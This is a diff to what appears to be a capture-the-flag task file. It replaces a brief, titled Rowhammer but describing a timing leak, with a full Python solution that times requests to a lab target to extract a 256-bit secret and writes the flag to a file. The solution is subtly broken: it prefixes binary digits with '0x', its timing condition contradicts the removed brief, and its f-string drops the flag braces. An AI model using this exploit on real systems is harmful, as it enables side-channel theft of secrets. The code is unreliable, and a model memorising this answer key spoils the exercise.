@@ -1,15 +1,26 @@
-# Task 020: Rowhammer
+# Hardware Security Task 001 (Level 4 - Complete)
 
-## Objective
-Exploit Rowhammer vulnerability to extract secret value.
+The hardware comparator leaks timing based on matching bits.
 
-## Vulnerability
-- Correct value: 22 cycles (fast)
-- Incorrect value: 170 cycles (slow)
+Complete Python exploit:
+```python
+import requests
 
-The secret produces the **MINIMUM** exec_time.
+secret = 0
+for bit_pos in range(256):
+    guess_0_bits = [(secret >> (255-j)) & 1 for j in range(bit_pos)] + [0] * (256-bit_pos)
+    guess_1_bits = [(secret >> (255-j)) & 1 for j in range(bit_pos)] + [1] + [0] * (255-bit_pos)
+    
+    guess_0_hex = '0x' + ''.join(str(b) for b in guess_0_bits)
+    guess_1_hex = '0x' + ''.join(str(b) for b in guess_1_bits)
+    
+    timing_0 = requests.post('http://target:8000/measure', json={'guess': guess_0_hex}).json()['timing']
+    timing_1 = requests.post('http://target:8000/measure', json={'guess': guess_1_hex}).json()['timing']
+    
+    if timing_1 > timing_0:
+        secret |= (1 << (255 - bit_pos))
 
-## Task
-1. Send requests with guess values (0-255)
-2. Find the guess with **MINIMUM** exec_time
-3. Submit: `FLAG{ROWHAMMER_0xXX}`
+flag = f"FLAG{hex(secret)[2:].upper().zfill(64)}"
+with open('/app/flags.txt', 'w') as f:
+    f.write(flag)
+```
